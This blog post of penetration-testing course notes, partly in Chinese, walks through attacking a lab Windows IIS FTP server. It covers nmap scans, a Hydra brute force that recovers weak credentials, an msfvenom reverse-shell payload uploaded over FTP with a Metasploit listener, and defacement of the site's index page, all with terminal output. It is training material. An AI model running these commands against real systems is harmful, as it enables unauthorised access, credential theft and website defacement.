---
layout: post
title: "Targeting Microsoft IIS FTP"
date: "2023-04-30"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - Exploitation
---

# Windows Black Box Penetration Test（Windows 黑盒渗透测试）
## Targeting Microsoft IIS FTP（针对 Microsoft IIS FTP）
# Demo: Targeting Microsoft IIS FTP（演示：针对 Microsoft IIS FTP）
We'll be exploring the process of targeting the FTP server that's running on the target system. And let's see what we're able to do in terms of gaining access. And we'll also learn a few interesting things regarding how the target system has been configured.

We can take a look at how to target Microsoft IIS FTP or the FTP server running on the target.

We explored the process of performing port scanning and enumeration. And we were able to identify that we have port 21 open, that's running Microsoft ftp, and port 80 open.

I'll just perform the scan on these two ports, as that's what we're going to be targeting. Why am I also scanning port 80? The way Microsoft IIS works, more specifically, on Windows Server. We already know what Microsoft IIS is. It's a web server that's used to host web applications or website, etc. And Microsoft FTP is a package. Or it's part of the Microsoft IIS package in the Microsoft IIS solution. So in any event whenever you see Microsoft ftp, and that's very specific, ftpd means FTP Daemon, and you also see a Microsoft IIS web server, it really means one of the two things. Number one, it means that they're both intertwined in that. The ftp server is used to allow authenticated users to modify the web server directory. And that's what you typically see with websites or web hosting companies is they have a web server that's hosting web applications. And you also have ftp running. And it's via ftp you can modify or upload website files, download website files, etc.

```
nmap -sV -sC -p21,80 10.0.28.97
```

We can perform a directory brute force on the web server or in order to identify hidden directories and files. But before we do that, it'd be much better if we can try and target the ftp server.

But where do we start in regards to exploiting ftp? We can start off by identifying or performing some basic vulnerability detection.

And the first vulnerability I want to check in regards to ftp is whether anonymous ftp access has been enabled. Anonymous ftp access is a configuration that allows anyone to access the ftp server without providing legitimate credentials. And the way you can test this is either through an Nmap script.

```
ls -al /usr/share/nmap/scripts/ | grep ftp-
```

We have the ftp-anon script. So in order to test this particular ftp server and see whether anonymous access has been enabled.

```
nmap -sV -p 21 --script=ftp-anon 10.0.28.97
```

We can also test it manually by using the ftp client.

```
ftp 10.0.28.97 21
```

It's going to prompt you to enter credentials.

```
anonymous

ftp> exit
```

We can say anonymous or just hit Enter.

That means anonymous ftp access is not enabled.

The next attack that we can perform is FTP brute force.

Performing a brute force can be done through the use of the Metasploit Framework. Or you can do it with the holy grail of brute forcing tools, which is Hydra.

We can utilize Hydra to perform a brute force on the FTP server in order to identify legitimate credentials that we can then use to authenticate.

`-L`: Specify the word list that contains the usernames that we would like to perform the brute force with.

`-P`: for the password list.

We then need to provide the protocol that we are performing the brute force on, which in this case is ftp.

```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.28.97 ftp
```

```
[21][ftp] host: 10.0.28.97 login: administrator password: vagrant
```

That means, and in the case of ftp on Windows and on Linux, the credentials are user accounts on the system. So that means if we've been able to identify the administrator, tha administrator password, then this is pretty much, the password, the username, or rather the user account on the Windows system. Now the password might be different in certain cases unless the password has been reused.

The password is vagrant. And from the Nmap scan, we were able to identify that the host name is also vagrant. We can also try and see whether there is a user account called vagrant, as it's being reused quite a bit. 

```
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.28.97 ftp
```

Do store these credentials as we'll be testing them and seeing whether they can be used to login into other services. The reason for that is it all comes down to the password reuse vulnerability within companies where employees and individuals tend to reuse passwords for multiple services, primarily because remembering passwords is very difficult. So make sure to store that information.

`-I`: skip waiting.

```
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.28.97 ftp -I
```

We can also utilize the unix_users to see whether any of the usernames can be password. 

```
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt 10.0.28.97 ftp -I
```

```
[21][ftp] host: 10.0.28.97 login: vagrant password: vagrant
```

We can login to the ftp server.

```
ftp 10.0.28.97 21

administrator
vagrant
```

We are currently utilizing the ftp client. And the syntax for the ftp client is very simple.

We can use the standard Unix or Linux directory commands or file system commands.

```
ftp> ls

caidao.asp
hahaha.jpg
index.html

ftp> exit
```

That will list out the contents of the ftp server.

What this means is that the ftp server directly takes us to the directory of the web server or where the web application is stored.

And that means that we pretty much can deface the web application or modify the contents of the web application.

We have an asp file here. Microsoft IIS supports various file extensions, and one of them is asp. And that means that it can execute asp files.

```
http://10.0.28.97/caidao.asp
```

That was executed successfully.

And the ftp client allows us to download or upload files to and from the ftp server.

What we could do now is try and generate an asp reverse shell with msfvenom. And then upload the asp file or aspx file onto the ftp server, consequently the web server, and then try and execute it and see whether we can obtain a reverse shell.

This might not work or probably will not work in most cases because in certain cases, asp code is confined to very simple execution. And in the context of a reverse shell, it might not work.

And we can also test and see whether we can log in with the use of vagrant.

```
ftp 10.0.28.97 21

vagrant
vagrant

ftp> exit
```

We're verified that.

What we can do now is use msfvenom to generate the asp payload.

Kali Linux: 10.10.16.2

`-f`: The output format is going to be asp.

We can output this into asp or aspx. Let's do aspx because that works better in terms of execution. So we'll generate the aspx payload.

```
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f asp > shell.aspx
```

`Split Terminal Horizontally`

And we can then upload it to the ftp server, which will just be in the web server directory itself.

We can now log in via ftp.

```
ftp 10.0.28.97 21

vagrant
vagrant
```

To upload a file to an ftp server.

```
ftp> put shell.aspx
ftp> dir
```

We can start up msfconsole and set up the handler, or the listener, that will receive the connection if the aspx file is executed.

```
use multi/handler
```

We'll set the payload to the one that we set when generating the payload with msfvenom.

```
set payload windows/shell/reverse_tcp
```

```
set LHOST 10.10.16.2
set LPORT 1234
run
```

And we can now try and execute this via the browser. I'll navigate to the browser.

And we should be able to access shell.aspx. And if it's executed successfully, we should receive a reverse shell on our handler.

```
http://10.0.28.97/shell.aspx
```

We have an error here. And it's a runtime error.

You can also try and generate an asp file itself. But that will not work.

All I'm trying to highlight here is that there are various attack vectors that you can utilize.

So we have not been able to get a reverse shell yet.

From the perspective of a penetratin test and the company that we are performing the pen test for, this is already a security vulnerability and a breach of the system security in that if an attacker would have gained access to the ftp server, and they have not been able to gain a reverse shell, the next step for them would be to deface the website.

Defacing the website just means modifying the web application or downloading client data or information that's stored within this directory.

And in the case of defacing a website, we can just modify index.html to highlight the fact that the web server has been hacked.

```
ftp> get index.html
```

Open up a new tab here or a new terminal.

```
cd Desktop/Win2k8/
ls
vim index.html
```

In a real penetration test, you're obviously not allowed to do that, to modify the application or play around with customer data.

```
<head>
    <style>
        body {
            background-color: red;
        }
    </style>
</head>
<body>
    <h1>Website Hacked!!!</h1>
</body>
```

This is typically what a web developer would be doing. They have the website files. And they can push changes like so.

Get rid of the image itself.

```
ftp> put index.html
ftp> ls
```

```
http://10.0.28.97/
```

An attacker would typically be able to modify the web application. And if it stores customer data locally, then that information can also be obtained.

That is how to target the ftp service. We have not really get any other information apart from the credentials we were able to gather. And these are pertinent to local accounts on the Windows system.

We've identified two user accounts on the system, one of which is the administrator, and the other one is the user vagrant. And these credentials can be very useful in terms of password reuse tests, where we can test other services and see whether these passwords work.

```
[21][ftp] host: 10.0.28.97 login: administrator password: vagrant
[21][ftp] host: 10.0.28.97 login: vagrant password: vagrant
```

We've taken a look at how to target the ftp server, more specifically, the Microsoft IIS FTP server. And we didn't get anything useful apart from credentials. And from a pen tester's perspective, we have already compromised the system to an extent. And that particular access gave us the ability to modify the web application that's being hosted on the web server on port 80.

# Targeting Microsoft IIS FTP
## Overview
Goal

The objective of this lab is to outline the various techniques that can be used to exploit a Windows system running a Microsoft FTP server.

## Tasks
Pre-requisites

1. Basic familiarity with Nmap.
2. Basic familiarity with the Metasploit Framework.

Requirements

This task does not have any requirements.

# 针对 Microsoft IIS FTP
## 概述
目标

本实验的目的是概述可用于利用运行 Microsoft FTP 服务器的 Windows 系统的各种技术。

## 任务
先决条件

1. 基本熟悉 Nmap。
2. 基本熟悉 Metasploit 框架。

要求

此任务没有任何要求。

# 复现视频内容
```
root@attackdefense:~# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.4        attackdefense.com attackdefense
127.0.0.1 AttackDefense-Kali
10.10.16.4      attackdefense.com attackdefense
10.0.26.121    demo.ine.local
```

10.0.26.121    demo.ine.local

Kali Linux: 10.10.16.4

```
root@attackdefense:~# nmap -sV -sC -p 21,80 10.0.26.121
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-30 17:22 IST
Nmap scan report for demo.ine.local (10.0.26.121)
Host is up (0.0031s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.21 seconds
```

```
root@attackdefense:~# ls -al /usr/share/nmap/scripts/ | grep ftp-
-rw-r--r-- 1 root root  4530 Oct 26  2021 ftp-anon.nse
-rw-r--r-- 1 root root  3253 Oct 26  2021 ftp-bounce.nse
-rw-r--r-- 1 root root  3108 Oct 26  2021 ftp-brute.nse
-rw-r--r-- 1 root root  3272 Oct 26  2021 ftp-libopie.nse
-rw-r--r-- 1 root root  3290 Oct 26  2021 ftp-proftpd-backdoor.nse
-rw-r--r-- 1 root root  3768 Oct 26  2021 ftp-syst.nse
-rw-r--r-- 1 root root  6021 Oct 26  2021 ftp-vsftpd-backdoor.nse
-rw-r--r-- 1 root root  5923 Oct 26  2021 ftp-vuln-cve2010-4221.nse
-rw-r--r-- 1 root root  5736 Oct 26  2021 tftp-enum.nse
```

```
root@attackdefense:~# nmap -sV -p 21 --script=ftp-anon 10.0.26.121
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-30 17:29 IST
Nmap scan report for demo.ine.local (10.0.26.121)
Host is up (0.0026s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds
```

```
root@attackdefense:~# ftp 10.0.26.121 21
Connected to 10.0.26.121.
220 Microsoft FTP Service
Name (10.0.26.121:root): anonymous
331 Password required for anonymous.
Password: 
530 User cannot log in.
ftp: Login failed
ftp> exit
221 Goodbye.
```

```
root@attackdefense:~# hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.26.121 ftp
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-30 17:34:30
[DATA] max 16 tasks per 1 server, overall 16 tasks, 169512 login tries (l:168/p:1009), ~10595 tries per task
[DATA] attacking ftp://10.0.26.121:21/
[STATUS] 4568.00 tries/min, 4568 tries in 00:01h, 164944 to do in 00:37h, 16 active
[21][ftp] host: 10.0.26.121   login: administrator   password: vagrant
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

```
root@attackdefense:~# hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_users.txt 10.0.26.121 ftp -I
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-30 17:40:37
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 168 login tries (l:1/p:168), ~11 tries per task
[DATA] attacking ftp://10.0.26.121:21/
[21][ftp] host: 10.0.26.121   login: vagrant   password: vagrant
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-30 17:40:40
```

```
[21][ftp] host: 10.0.26.121   login: administrator   password: vagrant
[21][ftp] host: 10.0.26.121   login: vagrant   password: vagrant
```

```
root@attackdefense:~# ftp 10.0.26.121 21
Connected to 10.0.26.121.
220 Microsoft FTP Service
Name (10.0.26.121:root): administrator
331 Password required for administrator.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49366|)
125 Data connection already open; Transfer starting.
10-28-21  07:22AM       <DIR>          aspnet_client
10-28-21  07:19AM                   28 caidao.asp
10-28-21  07:18AM                34251 hahaha.jpg
10-28-21  07:18AM              1116928 index.html
10-28-21  07:18AM              2439511 seven_of_hearts.html
10-28-21  07:18AM               384916 six_of_diamonds.zip
10-28-21  07:22AM               184946 welcome.png
226 Transfer complete.
ftp> exit
221 Goodbye.
```

```
http://10.0.26.121/caidao.asp
```

```
root@attackdefense:~# ftp 10.0.26.121 21
Connected to 10.0.26.121.
220 Microsoft FTP Service
Name (10.0.26.121:root): vagrant
331 Password required for vagrant.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> exit
221 Goodbye.
```

Kali Linux: 10.10.16.4

```
root@attackdefense:~# ifconfig
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.16.4  netmask 255.255.255.0  broadcast 10.10.16.255
        ether 02:42:0a:0a:10:04  txqueuelen 0  (Ethernet)
```

```
root@attackdefense:~# msfvenom -p windows/shell/reverse_tcp LHOST=10.10.16.4 LPORT=1234 -f asp > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of asp file: 38185 bytes
root@attackdefense:~# pwd
/root
```

```
root@attackdefense:~# ftp 10.0.26.121 21
Connected to 10.0.26.121.
220 Microsoft FTP Service
Name (10.0.26.121:root): vagrant
331 Password required for vagrant.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49422|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************| 38255       11.39 MiB/s    --:-- ETA
226 Transfer complete.
38255 bytes sent in 00:00 (4.64 MiB/s)
ftp> dir
229 Entering Extended Passive Mode (|||49424|)
125 Data connection already open; Transfer starting.
10-28-21  07:22AM       <DIR>          aspnet_client
10-28-21  07:19AM                   28 caidao.asp
10-28-21  07:18AM                34251 hahaha.jpg
10-28-21  07:18AM              1116928 index.html
10-28-21  07:18AM              2439511 seven_of_hearts.html
04-30-23  05:28AM                38255 shell.aspx
10-28-21  07:18AM               384916 six_of_diamonds.zip
10-28-21  07:22AM               184946 welcome.png
226 Transfer complete.
ftp> 
```

```
root@attackdefense:~# msfconsole -q
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.16.4
LHOST => 10.10.16.4
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.4:1234 

```

```
http://10.0.26.121/shell.aspx
```

```
Server Error in '/' Application.
Runtime Error
Description: An application error occurred on the server. The current custom error settings for this application prevent the details of the application error from being viewed remotely (for security reasons). It could, however, be viewed by browsers running on the local server machine.

Details: To enable the details of this specific error message to be viewable on remote machines, please create a <customErrors> tag within a "web.config" configuration file located in the root directory of the current web application. This <customErrors> tag should then have its "mode" attribute set to "Off".


<!-- Web.Config Configuration File -->

<configuration>
    <system.web>
        <customErrors mode="Off"/>
    </system.web>
</configuration>


Notes: The current error page you are seeing can be replaced by a custom error page by modifying the "defaultRedirect" attribute of the application's <customErrors> configuration tag to point to a custom error page URL.


<!-- Web.Config Configuration File -->

<configuration>
    <system.web>
        <customErrors mode="RemoteOnly" defaultRedirect="mycustompage.htm"/>
    </system.web>
</configuration>
```

```
ftp> get index.html
local: index.html remote: index.html
229 Entering Extended Passive Mode (|||49484|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************|  1090 KiB   26.83 MiB/s    00:00 ETA
226 Transfer complete.
WARNING! 13 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
1116928 bytes received in 00:00 (26.76 MiB/s)
```

```
root@attackdefense:~# vim index.html
root@attackdefense:~# cat index.html 
<html>
<head>
        <style>
                body {
                        background:url('hahaha.jpg') no-repeat center center;
                        min-height: 100%;
                        background-color: red;
                }
        </style>
</head>
<body>
        <h1>Website Hacked!!!</h1>
</body>
</html>
```

```
ftp> put index.html
local: index.html remote: index.html
229 Entering Extended Passive Mode (|||49498|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************|   223        5.45 MiB/s    --:-- ETA
226 Transfer complete.
223 bytes sent in 00:00 (100.86 KiB/s)
```

```
[21][ftp] host: 10.0.26.121   login: administrator   password: vagrant
[21][ftp] host: 10.0.26.121   login: vagrant   password: vagrant
```

